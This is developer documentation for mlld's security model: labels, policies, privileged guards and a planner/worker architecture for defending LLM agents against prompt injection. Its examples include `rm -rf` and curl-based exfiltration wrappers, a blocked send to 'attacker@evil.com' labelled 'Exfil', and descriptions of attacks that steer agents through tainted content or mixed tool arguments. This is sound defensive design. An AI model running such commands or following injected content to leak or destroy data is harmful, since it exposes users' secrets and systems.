# Labels, Policies, and Guards in mlld

mlld's security model is built on a simple insight: you can't stop an LLM from being tricked, but you **can** stop the consequences from happening. Labels track facts about data — what it is, where it came from, whether it's trustworthy. Policies declare rules about what that data is allowed to do. Guards provide imperative hooks for inspection, transformation, and strategic overrides. The runtime enforces all of this regardless of LLM intent.

---

## Principles

These principles describe how to use mlld's security model effectively. They apply whether you're writing policy, designing tools, building agents, or debugging something that isn't working.

### 1. Enforce structurally, don't exhort via prompts

If your fix is "please use exact field names" or "please use only the referenced inputs," you don't have a fix — you have a wish. Prompt discipline drifts under normal conditions and fails entirely under adversarial ones. Use records with `=> record` coercion, typed worker parameters, handle-bearing control args, and read projections. Every constraint that can be moved from prompt to structure should be. When you catch yourself adding another "please" to a system prompt, look for the structural alternative.

### 2. Let the runtime own runtime contracts

If you're writing code that reads a tool's bound input record (its `facts:` / `data:` / `correlate:` — or the legacy `controlArgs` on the exe), merges `literal_inputs` into authorization intent, projects slot state, validates handle shapes, or reimplements tool metadata lookups — stop. You're recreating a runtime contract in orchestration code. The runtime exposes a primitive for whatever you're trying to do; find it and use it. Benchmark-side glue that "just makes this one case pass" accumulates into the exact compatibility layer mlld exists to replace.

### 3. Tool metadata is the single source of truth

Bucketed intent, extraction contracts, `updateArgs` validation, read projections, authorization compilation — all derive from tool declarations. When you need a contract somewhere (planner prompts, extract schemas, validation checks), the answer is usually "read it from the tool metadata," not "restate it in a helper." Information that lives in two places will drift.

### 4. Phases don't mix

Resolve finds targets. Extract reads content. Execute writes. Compose reasons. A tool that does two is a tool with an injection surface (the planner sees attacker-controlled content alongside handles). A phase that does two conflates validation concerns (extraction guessing at recipients mixes reading with resolution). Phase boundaries are security boundaries — keep them clean. When in doubt, split.

### 5. Narrow the LLM's view — structurally, at two layers

Show the LLM only what it needs. Do this structurally, in two places:

**At the worker's interface.** Resolve slot references into concrete typed parameters *before* calling the worker. A worker with `(slotState, request)` will drift no matter what the prompt says; a worker with `(target, inputs, request)` cannot access what it wasn't given.

**At the record's boundary.** Use named read modes to serve different agent roles from the same record. The planner sees `{value: "email"}` — value plus handle, structured for selection. The worker sees content but with facts masked. A context reader sees content with no handles at all. Same record, different visibility per audience:

```mlld
record @email = {
  facts: [from: string, message_id: string],
  data: [subject: string, body: string],
  read: {
    role:planner: [{value: "from"}, {value: "message_id"}, subject],
    role:worker: [{mask: "from"}, subject, body]
  }
}
```

Named read modes are a strict value whitelist: unlisted fields are schema-visible protected, while {omit} hides existence entirely. The worker cannot accidentally see `message_id`. The planner cannot accidentally see `body`. Each role's visibility is enforced by the record definition, not by orchestration code that hopes to filter correctly.

This is role-based access control built into the data layer. One record declares all the data once; named modes carve out per-role views; the runtime guarantees each agent sees only its contract. Orchestration code never has to mask fields or build role-specific views — the record does it structurally. When designing multi-agent systems, define the record with everything, then declare a read mode per agent role.

### 6. Selection beats re-derivation

Preserve handle-bearing values in records. Let planners select from grounded candidates. Don't reconstruct identifiers in JS or rebuild values the agent could have passed through. The moment you rebuild a value, you've broken the proof chain — the new value has no fact label, no source attribution, no handle. If the agent can see a value and you need the agent to reference it later, pass the handle, not a copy.

### 7. Proof flows through values plus factsources, not handle strings

Each fact-bearing value carries `factsources` metadata identifying its origin record, instance key, coercion id, and array position. That metadata travels with the value through assignment, parameter binding, shelf I/O, and the bridge — it is the durable cross-phase identity. Handles are per-call boundary labels the LLM uses to refer to fact-bearing values inside a single tool surface; each `@claude` invocation mints fresh handle strings via projection, and they are not portable across calls. Cross-phase identity flows through the underlying values plus their factsources via shelves and `known` values — the runtime's proof claims registry is value-keyed, not handle-string-keyed, so a planner's `known` value matches a worker's freshly-minted handle for the same value automatically. Shelf projection caches follow the same rule: they store handle-free role projection plans keyed by `.mx.key`, then mint fresh handles for the active LLM call at read time. Worker returns use the `handle` field type to enforce that fact-bearing values cross phase boundaries as projection-minted handles rather than as bare strings the LLM might fabricate. See `facts-and-handles` for the per-call ephemeral model. If your agent is copying preview strings around as authorization, you're inviting drift.

### 8. The right bucket for the right proof

Bucketed intent has three slots, each with a distinct proof source. Handles from tool results go in `resolved`. User-typed literals go in `known`. Tools with no constraints go in `allow`. When a planner request has separate fields for control args (handles) and payload values (user typed), merge them into the right buckets before calling `@policy.build` — don't build a richer intent shape in orchestration code.

### 9. Taint is sticky; proof is specific

Taint (`untrusted`, `influenced`, `src:*`) flows through every transformation and can only be stripped by privileged guards. It answers "is this data contaminated?" Proof (`fact:*`, `known`) attaches to specific values and answers "did this specific value come from an authoritative source?" These are different mechanisms for different questions. Design defended agents to trust specific values via proof, not broad inputs via taint removal.

### 10. The runtime owns observability

When a defended agent is failing in ways the error messages don't explain, enable runtime tracing (`--trace effects` or `--trace verbose`). Cause-and-effect chains become visible in the shelf/guard/handle/auth/policy event stream. Don't add custom logging helpers, ad hoc probes, or debug state. The runtime owns the trace — use it.

---

## Built-in Rules Reference

There are **8 built-in default rules** you can enable in `policy.defaults.rules`, plus one **per-tool structural check** (`correlate-control-args`) that fires when a tool's bound input record declares `correlate: true` (or has >1 `facts:` fields and defaults to `true`):

| Rule | What it blocks | When it fires |
|---|---|---|
| `no-secret-exfil` | `secret`-labeled data flowing to operations classified as `exfil` | A value with the `secret` label (declared or auto-applied from keychain) reaches an exe whose labels map to the `exfil` risk category |
| `no-sensitive-exfil` | `sensitive`-labeled data flowing to `exfil` operations | Same as above but for the `sensitive` label (covers business-confidential data that isn't a cryptographic secret) |
| `no-untrusted-destructive` | `untrusted`-labeled data flowing to `destructive` operations | When the tool has a bound input record with `facts:` entries, only the fact args are checked. Otherwise, any arg with the `untrusted` label reaching an exe mapped to `destructive` triggers the rule. Override with `{ "rule": "no-untrusted-destructive", "taintFacts": true }` to force all-arg checking |
| `no-untrusted-privileged` | `untrusted`-labeled data flowing to `privileged` operations | Same pattern but for operations mapped to `privileged` |
| `no-send-to-unknown` | Sending to a recipient without proof | A destination fact arg lacks fact proof or `known` attestation on an `exfil:send` operation. When the tool has a bound input record with `facts:`, any `fact:*` on those fields suffices; without a record, the field-name heuristic (`fact:*.email`) applies |
| `no-destroy-unknown` | Deleting a resource without proof | A target fact arg lacks fact proof or `known` attestation on a `destructive:targeted` operation. When the tool has a bound input record with `facts:`, any `fact:*` on those fields suffices; without a record, `fact:*.id` applies |
| `no-novel-urls` | LLM-constructed URLs that could encode exfiltrated data | A URL in an `influenced` tool-call argument doesn't appear verbatim in any prior tool result or user payload. Requires `untrusted-llms-get-influenced` to be active |
| `untrusted-llms-get-influenced` | Doesn't block anything directly — it **auto-applies** the `influenced` label to LLM output when the LLM's input contains `untrusted` data | An `exe llm` processes input that carries the `untrusted` label. The output gets `influenced` added. You then restrict `influenced` data separately via `policy.labels.influenced.deny` |
| `correlate-control-args` *(per-tool, not a default)* | Cross-record fact-arg mixing on a single dispatch | Fires automatically at dispatch time when a write tool's bound input record declares `correlate: true` (or has >1 `facts:` fields and defaults to `true`). Every fact arg's `factsources` provenance must point to the same source record instance (matched by `instanceKey` from the record's `key:` field, or by `(coercionId, position)` for keyless records). Cross-source dispatches are denied. Defends the canonical "mix tx_001's id with tx_002's recipient" attack class. See `policy-authorizations` for the full attack model. Not enabled via `defaults.rules` — opt in per-tool via the input record. |

The first four are **negative checks** (they block contaminated data from reaching operations). `no-send-to-unknown` and `no-destroy-unknown` are **positive checks** (they require proof that a value came from an authoritative source). `no-novel-urls` is a **URL identity check** (the URL must exist in external input context). `untrusted-llms-get-influenced` is a **labeling rule**. `correlate-control-args` is a **cross-arg correlation check** that runs only on tools that opt in via metadata.

The risk categories (`exfil`, `destructive`, `privileged`) are not magic — you define what maps to them in `policy.operations`.

---

## 1. What Labels Are

Labels are strings attached to values. They propagate automatically through every transformation — template interpolation, method calls, pipelines, collection operations. You cannot accidentally strip a label by transforming data.

There are four categories:

| Category | Examples | How applied |
|---|---|---|
| **Sensitivity** | `secret`, `sensitive`, `pii` | You declare them on variables |
| **Trust** | `trusted`, `untrusted` | You declare them, or `defaults.unlabeled` applies them |
| **Attestation** | `known`, `known:internal` | Declared on variables, or carried through from trusted tool results |
| **Fact** | `fact:@contact.email`, `fact:internal:@contact.email` | Minted by record coercion on `=> record` output |
| **Influence** | `influenced` | Auto-applied by the `untrusted-llms-get-influenced` rule |
| **Source** | `src:cmd`, `src:mcp`, `src:file`, `dir:/path`, etc. | Auto-applied by the runtime |

### Declaring labels

Labels go before the variable name:

```mlld
var secret @apiKey = "sk-abc123"
var pii @patientRecords = <clinic/patients.csv>
var sensitive @internalConfig = <./company-config.json>
var untrusted @userInput = @input
```

You can combine labels with commas:

```mlld
var untrusted,secret @leakedKey = <./found-on-internet.txt>
```

### Label propagation

Labels follow data through every transformation:

```mlld
var secret @customerList = <internal/customers.csv>
var @parsed = @customerList | @parse
var @firstTen = @parsed.slice(0, 10)
var @summary = `Top customers: @firstTen`

show @summary.mx.labels   >> ["secret"]
```

The `secret` label survived parsing, slicing, and template interpolation. This is guaranteed by the runtime.

### Inspecting labels

Every value carries metadata accessible via `.mx`:

```mlld
show @data.mx.labels    >> user-declared labels: ["secret", "pii"]
show @data.mx.taint     >> full picture: ["secret", "pii", "src:file", "dir:/internal"]
show @data.mx.sources   >> source references
```

- **`labels`** — only what you declared (`secret`, `pii`, `untrusted`)
- **`taint`** — union of declared labels + auto-applied source markers
- **`sources`** — transformation trail (file paths, tool names)

### Auto-applied labels

Some labels are applied automatically by the runtime:

- **`secret`** is auto-applied to anything retrieved from the keychain
- **Source labels** (`src:cmd`, `src:file`, `src:mcp`, etc.) are applied whenever data enters the system through that channel
- **`influenced`** is applied when the `untrusted-llms-get-influenced` rule is enabled and an LLM processes untrusted input

### Trust asymmetry

`untrusted` is sticky. You can't remove it by adding `trusted` — that just creates a conflict where both labels coexist. Removing `untrusted` requires a privileged guard (see section 3). Design with this in mind: once data is untrusted, treat it as untrusted.

---

## 2. What Policies Are

A policy is a declarative object that defines security rules for your script. It has several sections: `defaults`, `operations`, `labels`, and optionally `locked`.

```mlld
policy @p = {
  defaults: {
    rules: ["no-secret-exfil", "no-untrusted-destructive"],
    unlabeled: "untrusted"
  },
  operations: {
    exfil: ["net:w"],
    destructive: ["fs:w"],
    privileged: ["sys:admin"]
  }
}
```

### `defaults.rules` — enable built-in rules

This is where you turn on the built-in rules from the table above. Pick the ones relevant to your use case:

```mlld
defaults: {
  rules: [
    "no-secret-exfil",           >> block secrets from leaving the system
    "no-sensitive-exfil",        >> block sensitive data from leaving
    "no-untrusted-destructive",  >> block untrusted data from destructive ops
    "no-untrusted-privileged",   >> block untrusted data from privileged ops
    "untrusted-llms-get-influenced"  >> mark LLM output as influenced
  ]
}
```

### `defaults.unlabeled` — auto-label unlabeled data

Without this, data with no explicit labels has no trust label. Set it to `"untrusted"` to treat all unlabeled data as untrusted by default:

```mlld
defaults: {
  unlabeled: "untrusted"
}
```

Now file-loaded data, command output, and anything else without explicit labels automatically gets the `untrusted` label. Data you explicitly label (e.g., `var trusted @config = ...`) is unaffected.

### `operations` — the two-step pattern

You label your exe functions with **semantic labels** describing what they do (`net:w` = network write, `fs:w` = filesystem write). Then policy maps those to **risk categories**:

```mlld
>> Step 1: Label exe with what it does
exe net:w @postToSlack(msg) = run cmd { curl -X POST @channel -d @msg }
exe fs:w @deleteFile(path) = run cmd { rm -rf "@path" }
exe sys:admin @restartService(name) = run cmd { systemctl restart @name }

>> Step 2: Policy maps semantic labels to risk categories
operations: {
  exfil: ["net:w"],
  destructive: ["fs:w"],
  privileged: ["sys:admin"]
}
```

The built-in rules reference these risk categories. `no-secret-exfil` blocks `secret` data from reaching anything classified as `exfil`. `no-untrusted-destructive` blocks `untrusted` data from reaching anything classified as `destructive`.

**Alternative: direct labeling.** You can skip the mapping and label exe functions directly with risk categories: `exe exfil @sendData(...)`. This works but couples your function definitions to risk policy. The two-step pattern is preferred for maintainability.

### `labels` — custom flow rules

For rules beyond the built-ins listed above, define explicit deny/allow lists per label:

```mlld
labels: {
  secret: {
    deny: ["op:show"]          >> secrets can't be displayed
  },
  pii: {
    deny: ["op:cmd", "net:w"]  >> PII can't reach shell or network
  },
  "src:mcp": {
    deny: ["destructive"],     >> MCP data can't reach destructive ops
    allow: ["op:cmd:git:status"]  >> ...except git status is fine
  },
  influenced: {
    deny: ["destructive", "exfil"]  >> LLM-influenced data is restricted
  }
}
```

Deny/allow targets can be:
- Auto-applied operation labels: `op:cmd`, `op:show`, `op:sh`
- Hierarchical operation labels: `op:cmd:git` blocks all git subcommands
- Your semantic labels: `net:w`, `fs:w`
- Risk categories: `exfil`, `destructive`, `privileged`

**Most-specific-wins**: if you deny `op:cmd:git` but allow `op:cmd:git:status`, status is allowed while push/reset/etc. are blocked.

### `locked` — non-overridable policies

By default, policies are **unlocked** — privileged guards can create strategic exceptions to policy denials (see section 3). Set `locked: true` to make a policy's denials absolute:

```mlld
>> This policy cannot be overridden by anything
policy @absolute = {
  defaults: { rules: ["no-secret-exfil"] },
  operations: { exfil: ["net:w"] },
  locked: true
}
```

Use `locked: true` for constraints that should never have exceptions — security invariants that no guard, no matter how privileged, should be able to bypass.

---

## 3. What Guards Are

Guards are imperative hooks that run before and/or after operations. Where policies are declarative ("this flow is blocked"), guards are procedural ("inspect this, decide, transform if needed").

### Basic guard syntax

```mlld
guard @name TIMING TRIGGER = when [
  CONDITION => ACTION
  ...
]
```

- **Timing:** `before`, `after`, or `always` (`for` is shorthand for `before`)
- **Trigger:** a label that matches wherever it appears (on input data, on operations, or both)
- **Actions:** `allow`, `allow @transformed`, `deny "reason"`, `retry "reason"`

### Operation guards

Guard on operation labels to inspect data flowing into or out of operations:

```mlld
>> Guard on the data label, check the operation
guard @blockSecretExfil before secret = when [
  @mx.op.labels.includes("net:w") => deny "Secrets cannot flow to network operations"
  * => allow
]

>> Guard on the operation label, check the data
guard @blockSecretExfil before net:w = when [
  @input.any.mx.labels.includes("secret") => deny "Secrets cannot flow to network operations"
  * => allow
]
```

Both approaches are equivalent — choose whichever reads more naturally.

### Per-arg inspection

In operation guards, you can inspect individual args by name via `@mx.args`:

```mlld
guard @checkArgs before tool:w = when [
  @mx.op.name == "send_email" => [
    when [
      @mx.args.recipients.mx.labels.includes("secret") => deny "recipients contain secret data"
      @mx.args.body.mx.labels.includes("pii") => deny "email body contains PII"
      * => allow
    ]
  ]
  * => allow
]
```

Named access is preferred — you only reference the args you care about, and optional args that the caller omitted are simply not checked (avoiding null-vs-empty issues).

Positional access also works via `@input[n]` (where `@input` is the array of all arguments in declaration order):

```mlld
>> Positional equivalent — same behavior, less readable
guard @checkArgs before tool:w = when [
  @mx.op.name == "send_email" => [
    when [
      @input[0].mx.labels.includes("secret") => deny "recipients contain secret data"
      @input[2].mx.labels.includes("pii") => deny "email body contains PII"
      * => allow
    ]
  ]
  * => allow
]
```

Aggregate quantifiers work on the whole input array:
- `@input.any.mx.labels.includes("secret")` — true if any arg has the label
- `@input.all.mx.taint.includes("src:file")` — true if all args have the taint
- `@input.none.mx.labels.includes("pii")` — true if no arg has the label
- `@input.mx.labels` — union of all args' labels

### Guard composition

Guards run top-to-bottom in declaration order. Decision precedence: `deny > retry > allow @value > allow`. Before-phase transforms are last-wins; after-phase transforms chain sequentially.

### Privileged guards

Privileged guards have elevated powers:

```mlld
>> Prefix form
guard privileged @override before tool:w = when [
  @mx.op.name == "send_email" && @mx.args.recipients == ["john@gmail.com"] => allow
]

>> With-clause form
guard @override before tool:w = when [
  @mx.op.name == "send_email" && @mx.args.recipients == ["john@gmail.com"] => allow
] with { privileged: true }
```

**Critical: no wildcard arm in privileged guards that override policy.** When a privileged guard is meant to allow specific cases while letting policy block everything else, omit the `* => allow` wildcard. If no condition matches, the guard produces no action and the policy denial stands. A `* => allow` would override the policy for ALL calls — not just the ones you intended.

```mlld
>> WRONG: wildcard overrides policy for everything
guard privileged @bad before tool:w = when [
  @mx.op.name == "send_email" && @mx.args.recipients == ["safe@example.com"] => allow
  * => allow  >> this defeats the policy!
]

>> RIGHT: no wildcard — unmatched calls defer to policy
guard privileged @good before tool:w = when [
  @mx.op.name == "send_email" && @mx.args.recipients == ["safe@example.com"] => allow
]
```

What privileged guards can do that regular guards cannot:

- **Override unlocked policy denials.** A privileged guard returning `allow` on a matched condition takes precedence over an unlocked policy's deny. This is the mechanism for strategic exceptions — "I know the policy blocks this, but this specific case is authorized."
- **Remove protected labels.** Labels like `secret`, `untrusted`, and `src:*` can only be removed by privileged guards using `trusted!`, `!label`, or `clear!` syntax.
- **Survive `{ guards: false }`.** Disabling guards with `{ guards: false }` only disables non-privileged guards. Privileged guards always run.

What privileged guards **cannot** do:
- Override a **locked** policy. If the policy has `locked: true`, even privileged guards can't create exceptions.

### Catching denials inside an exe wrapper (`denied =>` arm)

A wrapper exe carrying a policy-relevant label can catch its own denials and redirect to a fallback path using a `when` expression with a `denied =>` arm. This is the structural foundation of the advice gate pattern — when an advice-labeled wrapper receives `influenced` fact state, the `no-influenced-advice` rule fires, the denied arm catches the denial, and the fallback runs structured de-biasing instead of letting the call fail:

```mlld
exe advice @adviceGate(query, factState, factSchema, model) = when [
  denied => @debiasedEval(@query, @factState, @factSchema, @model)
  * => @directAnswer(@query, @factState, @model)
]
```

When `@adviceGate` is invoked with input that triggers a policy denial (e.g. `no-influenced-advice` firing because `factState` carries `influenced`), the runtime catches the denial via the `denied =>` arm and runs `@debiasedEval` instead of letting the call fail. Without a denial, the `*` arm fires and `@directAnswer` runs.

Inside the `denied =>` arm, `@input` carries the value that triggered the denial (with security labels intact) so the fallback can re-examine the offending input and produce a debiased result. The wrapper exe can have a block body with `let` bindings or pre-processing — the runtime catches denials regardless of body shape.

Reserve `denied =>` for policy-aware fallback paths that have a meaningful response to a denial (debiasing, structured re-extraction, escalation). Don't use it as a generic try/catch — for ordinary error handling, let the denial propagate to the caller.

### How policies and guards interact

Policies and guards form a layered enforcement model:

```
Policy (declarative)
  │ Defines broad rules: "untrusted data cannot reach destructive operations"
  │ locked: true → absolute, no exceptions
  │ locked: false (default) → privileged guards can override
  │
Privileged Guards (imperative, elevated)
  │ Can override unlocked policy denials for specific cases
  │ Can remove protected labels
  │ Example: "allow send_email IF recipients match this exact value"
  │
Regular Guards (imperative, restricted)
  │ Can inspect, validate, transform, deny
  │ Cannot override policy denials
  │ Cannot remove protected labels
  │ Example: input validation, sanitization, logging
```

The key principle: **regular guards can only add restrictions, never remove them.** Privileged guards can create exceptions to unlocked policies. Locked policies are absolute.

---

## 4. Putting It Together

### Example: Protect customer data from exfiltration

```mlld
policy @p = {
  defaults: {
    rules: ["no-secret-exfil"],
  },
  operations: {
    exfil: ["net:w"]
  }
}

var secret @customers = <internal/customers.csv>

exe net:w @postToWebhook(data) = run cmd {
  curl -d "@data" https://hooks.example.com/ingest
}

>> This will be blocked by the runtime:
show @postToWebhook(@customers)
>> Error: Rule 'no-secret-exfil': label 'secret' cannot flow to 'exfil'
```

### Example: Treat all data as untrusted, protect destructive ops

```mlld
policy @p = {
  defaults: {
    rules: ["no-untrusted-destructive"],
    unlabeled: "untrusted"
  },
  operations: {
    destructive: ["fs:w"]
  }
}

var @userInput = <./input.txt>   >> auto-labeled untrusted

exe fs:w @deleteFile(path) = run cmd { rm -rf "@path" }

>> Blocked: untrusted data can't flow to destructive operations
show @deleteFile(@userInput)
```

### Example: Lock down PII with custom flow rules

```mlld
policy @p = {
  defaults: {
    rules: ["no-secret-exfil", "no-sensitive-exfil"],
    unlabeled: "untrusted"
  },
  operations: {
    exfil: ["net:w"]
  },
  labels: {
    pii: {
      deny: ["op:show", "op:cmd", "exfil"]
    }
  }
}

var pii @records = <clinic/patients.csv>

show @records              >> Blocked: pii can't flow to op:show
```

### Example: Track LLM influence on untrusted data

```mlld
policy @p = {
  defaults: {
    rules: [
      "no-untrusted-destructive",
      "untrusted-llms-get-influenced"
    ],
    unlabeled: "untrusted"
  },
  operations: {
    destructive: ["fs:w"]
  },
  labels: {
    influenced: {
      deny: ["destructive", "exfil"]
    }
  }
}

var untrusted @task = "Analyze this external input"
exe llm @process(input) = run cmd { claude -p "@input" }

var @result = @process(@task)
>> @result now carries: ["llm", "untrusted", "influenced"]
>> It cannot reach destructive or exfil operations
```

### Example: Policy + privileged guard for strategic exceptions

The most powerful pattern: a broad policy blocks dangerous flows, and a privileged guard creates precise exceptions for authorized cases.

```mlld
>> Broad policy: block all untrusted data from write operations
policy @p = {
  defaults: { rules: ["no-untrusted-destructive"] },
  operations: { destructive: ["tool:w"] }
}

>> Label the write tool
exe tool:w @send_email(recipients, subject, body) = [
  >> ... sends email
  => "sent"
]

>> Strategic exception: allow send_email ONLY to this specific recipient
>> No wildcard — unmatched calls defer to base policy (blocked)
guard privileged @authorized before tool:w = when [
  @mx.op.name == "send_email" && @mx.args.recipients == ["john@gmail.com"] => allow
]

var untrusted @taintedBody = "summary from untrusted source"

>> This succeeds — recipients match the authorized value
show @send_email(["john@gmail.com"], "Report", @taintedBody)

>> This is blocked — recipients don't match, falls through to policy
show @send_email(["attacker@evil.com"], "Exfil", @taintedBody)
```

This pattern is the foundation of **planner-worker authorization** — a clean planning LLM determines what actions are authorized (using handles from read-projected tool results), and the runtime enforces those decisions regardless of what a tainted worker LLM tries to do. See the records/facts/handles section below for the full provenance model.

### Example: Absolute constraint with locked policy

```mlld
>> This policy is absolute — no exceptions, no overrides
policy @noExfil = {
  defaults: { rules: ["no-secret-exfil"] },
  operations: { exfil: ["net:w"] },
  locked: true
}

>> Even a privileged guard cannot override this
guard privileged @attemptOverride before net:w = when [
  * => allow  >> this allow is ignored — policy is locked
]

var secret @apiKey = "sk-abc123"
exe net:w @postToSlack(msg) = run cmd { curl -X POST @channel -d @msg }

>> Still blocked, despite the privileged guard
show @postToSlack(@apiKey)
```

---

## 5. The Capability Agent Pattern

The recommended architecture for defended agents is a **persistent clean planner session with scoped framework workers**. The planner is one long-running `@claude` call. It calls framework-provided worker tools — `@rig.resolve`, `@rig.extract`, `@rig.execute`, `@rig.compose`, `@rig.advice` — each of which internally dispatches an isolated worker `@claude` call with a dedicated tool subset, read mode, shelf scope, and authorization scope.

The planner stays clean throughout. It never sees tainted content directly. Workers do the tainted-content work and return planner-safe results through two structural boundary mechanisms only:

- canonical record return for domain data: `=> @value as record @RecordType` or `=> @cast(@value, @RecordType)`
- explicit `->` return for control-plane attestation

Typed shelf state and execution logs are the substrate that both utility and security rely on — conversation history supplements state but does not replace it.

See `~/mlld/rig/plan-rig-refactor.md` for the full refactor plan and `~/mlld/mlld/spec-thin-arrow-llm-return.md` for the `->` primitive spec.

### How the planner stays clean

Two structural mechanisms, not prompt discipline:

1. **`role:planner` read projection.** The planner exe carries a `role:planner` label (see `spec-record-permissions-update.md`). Records project their `read: { role:planner: [...] }` whitelists at the LLM bridge. Unlisted data fields are protected. Fact fields get handles when the read mode requests them. The planner sees metadata + handles, not content.

2. **`->` taint scoping.** Worker tools return `->` values whose taint follows the expression's own inputs, not the exe's ambient scope (see `spec-thin-arrow-llm-return.md` §"Taint semantics"). A `->` expression constructed from handles (opaque, no taint) and literals (no taint sources) is clean even when the worker internally processed tainted content. This is the structural guarantee — not "the prompt tells the worker to filter," but "the `->` expression's dependency graph determines taint."

These compose: canonical record returns use mechanism 1 (read projection at the bridge). Explicit `->` attestation uses mechanism 2 (expression-level taint scoping). Both keep the planner uninfluenced when the developer uses the intended pattern.

### The five worker types

Each worker is a framework-provided tool the planner calls. Each has its own narrow scope.

**Resolve** — grounds entities and handles from planner-safe tool surfaces. Uses only `resolve:r` tools. Writes grounded records to planner-selected shelf slots. When the planner needs the grounded domain result, return it on the canonical record path — `=> @grounded as record @RecordType` or `=> @cast(@grounded, @RecordType)` — so the bridge applies the planner's `role:*` read projection. It is also acceptable to use `->` for a planner-facing envelope that intentionally differs from the canonical record return, for example `{ slot, count, contacts: @grounded, summary }`. The point is to differentiate the planner contract on purpose, not to bypass the normal record path casually.

**Extract** — reads tainted content from explicitly selected sources. Uses only `extract:r` tools. Source scope is framework-enforced via `sourceArgs` and `no-unknown-extraction-sources`. Output is contract-pinned via developer-supplied records using `@cast(@raw, @contract)` (see `spec-record-permissions-update.md` §3). Writes typed results to planner-selected extracted slots. When the planner needs the extracted structured result, return it canonically — `=> @extracted` if already coerced, or `=> @cast(@raw, @contract)` — so the planner sees the contract's `role:planner` projection. It is also acceptable to use `->` for a deliberately different planner envelope such as `{ slot, contract, status, result: @extracted }`. The rule is the same: use `->` when the planner-facing tool result is intentionally different.

The extract worker is also where proposal-style outputs belong: `*_payload` contracts for a single downstream write, or `*_proposal` contracts for multi-step tasks where the planner must review a worker-derived action proposal before authorizing execution.

**Execute** — performs exactly one concrete write under compiled per-step authorization. The planner passes authorization intent referencing handles from prior resolve calls. The framework checks `policy.authorizations.can_authorize[role:planner]` (see `spec-agent-authorization-permissions.md`), calls `@policy.build` to compile, and dispatches the worker with the single authorized write tool + compiled policy. No shelf scope. Pre-resolved typed inputs from the framework. Returns `-> { status, tool, result_handles?, summary }`.

One write per execute dispatch. Multi-step tasks are a planner-managed sequence of single-action execute calls. This keeps authorization reasoning, blast radius, and recovery simple.

**Compose** — produces the final user-facing answer. No tools (`tools: []`). Reads clean shelf state and execution log. The no-tools boundary is structural — it prevents the compose path from being an injection vector for additional tool calls. Returns `=-> @composedText` (same value to both channels).

**Advice** — preserves the explicit advice gate for recommendation-style tasks. Uses the `advice`-labeled `denied =>` handler path with `no-influenced-advice` as a structural defense and `@debiasedEval` as the fallback (see §3 "Catching denials"). Replaces compose when the task is advice-classified. Not optional — travel requires it.

### `=> record` vs `->`: data-plane vs control-plane

Two distinct return channels serve two distinct purposes:

**`=> record`** is the **data-plane** path. More concretely: `=> @value as record @RecordType` and `=> @cast(@value, @RecordType)` turn on record-mediated return filtering for the tool result. When that return crosses to an LLM caller, the bridge applies the active `role:*` read projection. This is how read tools (search, list, metadata lookup) communicate domain results to the planner — the planner sees fact fields with handles, data fields are omitted or masked per the record's read declaration.

**`->`** is the **control-plane** path. It lets a worker return a deliberately authored planner-visible object that is NOT produced by record read projection. This is for agent-to-agent communication: a worker that processed tainted content and performed actions needs to tell the planner what happened. That communication cannot be the worker LLM's own words, and it should not be a disguised domain-data path. The worker exe's mlld code — not the worker LLM — builds the `->` value programmatically from planner-safe sources: handles, status literals, counts, slot names, next-step signals. The `->` expression is the orchestrator-authored message.

`->` is the sharp-tool path for explicitly authored safe returns. A `->` built from handles (opaque, no taint) and literals (no taint sources) gives the planner a clean control message. If the developer stuffs tainted content into `->`, they are bypassing the intended pattern and the runtime will preserve that taint via expression-level taint scoping (see `spec-thin-arrow-llm-return.md` §"Taint semantics").

**`=->`** writes the same value to both channels — for cases where both consumers see the same thing (e.g., compose).

The design rule:

- Use `=> @value as record @RecordType` or `=> @cast(@value, @RecordType)` when the planner should see a record-projected view of domain data.
- Use `->` when the planner should see an orchestrator-authored attestation/status envelope rather than the worker's direct output.
- These are the only two structural mechanisms for safely returning values to a clean agent. Do not invent a third path in orchestration code.

**Strict mode**: any exe with `->` or `=->` in source NEVER falls back to `=>` for tool dispatch. If the `->` was in an unreached branch, the LLM sees `null`, not the `=>` value. This closes the "I thought I gated this" leak. See `spec-thin-arrow-llm-return.md` §"Strict mode."

### Authorization model

Write authorization is declared per role in the policy (see `spec-agent-authorization-permissions.md`):

```mlld
policy @p = {
  defaults: { rules: ["no-send-to-unknown", "no-untrusted-destructive"] },
  operations: { "exfil:send": ["exfil:send"] },
  authorizations: {
    deny: ["update_password"],
    can_authorize: {
      role:planner: [@sendEmail, @appendToFile, @deleteFile]
    }
  }
}
```

- **`deny`** — no role can authorize these tools, ever.
- **`can_authorize`** — which roles can authorize which tools. The framework checks this before calling `@policy.build`. Catalog entries can also declare `can_authorize: "role:planner" | false | [roles]`, which compiles additively into this field; policy wins on conflict.
- The planner's `role:planner` label is its **immutable identity** (from the exe declaration). Read overrides do NOT affect authorization — `with { read: "role:worker" }` changes visibility, not who you are.

The planner sees `<authorization_notes>` — auto-injected docs for tools it can authorize, generated from the policy's `can_authorize` field. Describes each tool's signature and fact args (from the bound input record's `facts:`) so the planner can construct valid authorization intent. Separate from `<tool_notes>` (which describes callable tools).

### Records use `role:*` read keys

Records declare per-role field visibility using `role:*` keys that match the labels on exes:

```mlld
record @email_msg = {
  facts: [from: string, message_id: string],
  data: [subject: string, body: string],
  read: {
    role:planner: [{ value: "from" }, { value: "message_id" }],
    role:worker: [{ mask: "from" }, subject, body]
  }
}
```

The record is the **single source of truth** for both data shape and access policy. The `role:planner` read omits subject and body (injection surfaces). The `role:worker` read shows content with identity masked. The runtime matches the active `role:*` label from the exe to the record's read key. One naming system, one place the mapping lives. See `spec-record-permissions-update.md` §1.

### Handles are universal and opaque

Any value can have a handle — fact or data, trusted or untrusted. Handles are opaque reference strings. They carry no content and no taint. A handle to a tainted email body is just `h_xyz`. The planner can hold it, pass it to a worker, reference it in authorization — without ever seeing the content behind it.

The security model operates on the **resolved value**, not on whether a handle exists. A handle to a data field resolves to a value with `untrusted` and no `fact:*` — positive checks deny. A handle to a fact field resolves to a fact-bearing value — positive checks pass. Handle existence doesn't grant proof or strip taint.

Workers use `.mx.handle` (one value → one handle) and `.mx.handles` (compound value → role-filtered projected form with handles for all visible fields) to construct clean `->` returns. `@mx.handles` (ambient) returns all handles in the current session scope. See `spec-record-permissions-update.md` §2.

### Typed state, not just conversation history

Shelf state and execution logs remain mandatory in defended mode. Conversation history supplements state but cannot replace it. Typed state is required for:

- heterogeneous grounded entities across domains
- contract-pinned extract outputs
- cross-worker data passing without prose laundering
- advice-gate inputs
- execution summaries and recovery

### The record modeling rule

